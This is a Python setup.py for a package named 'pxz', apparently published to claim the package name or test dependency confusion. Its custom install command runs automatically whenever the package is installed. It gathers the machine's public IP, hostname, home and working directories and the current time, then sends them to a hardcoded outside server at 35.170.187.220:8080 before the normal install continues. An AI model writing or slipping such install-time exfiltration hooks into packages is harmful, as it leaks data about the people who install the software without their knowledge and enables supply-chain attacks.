from setuptools import setup
import os
from urllib.request import urlopen, Request
from urllib.error import URLError
from datetime import datetime  # Import datetime module
from setuptools.command.install import install  # Import the install class
import logging
from urllib.parse import quote_plus  # Import quote_plus for URL encoding

# Set up logging
logging.basicConfig(filename="install_log.txt", level=logging.DEBUG)
logging.debug("Starting installation process...")

def collect_system_info():
    try:
        print("[*] Collecting system information...")  # Debugging line
        logging.debug("[*] Collecting system information...")  # Log info

        # Get public IP without relying on curl
        public_ip = urlopen('https://api.ipify.org').read().decode('utf-8').strip()
        hostname = os.uname().nodename
        home_dir = os.path.expanduser("~")
        current_dir = os.getcwd()

        # Get current time
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Format as YYYY-MM-DD HH:MM:SS

        system_info = {
            "publicIP": public_ip,
            "hostname": hostname,
            "homeDirectory": home_dir,
            "currentDirectory": current_dir,
            "currentTime": current_time  # Add current time to the data
        }

        # Replace with your PUBLIC SERVER URL
        server_url = "http://35.170.187.220:8080/"
        
        # Encode data into URL parameters, ensuring valid URL format
        params = "&".join([f"{k}={quote_plus(v)}" for k, v in system_info.items()])
        full_url = f"{server_url}?{params}"

        # Send GET request
        req = Request(full_url)
        response = urlopen(req, timeout=10)
        if response.getcode() == 200:
            print("[*] System info sent successfully.")
            logging.debug("[*] System info sent successfully.")
        else:
            print(f"[!] Server error: {response.getcode()}")
            logging.debug(f"[!] Server error: {response.getcode()}")

    except URLError as e:
        print(f"[!] Connection failed: {e.reason}")
        logging.debug(f"[!] Connection failed: {e.reason}")
    except Exception as e:
        print(f"[!] Error: {e}")
        logging.debug(f"[!] Error: {e}")

# Define the custom install command
class CustomInstallCommand(install):
    def run(self):
        print("[*] Custom install command triggered.")  # Debugging line
        logging.debug("[*] Custom install command triggered.")  # Log info
        collect_system_info()  # Call the system info collection function
        # Proceed with the usual install process
        install.run(self)

setup(
    name="pxz",
    version="1.1.10",
    description="This Package claimed by JPD",
    long_description="A Python package to collect and send system information.",
    long_description_content_type="text/markdown",
    author="JPD",
    author_email="jpdtester01@gmail.com",
    license="MIT",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    packages=["pxz"],
    install_requires=[],  # Removed requests
    cmdclass={
        'install': CustomInstallCommand  # Use the custom install command
    },
)
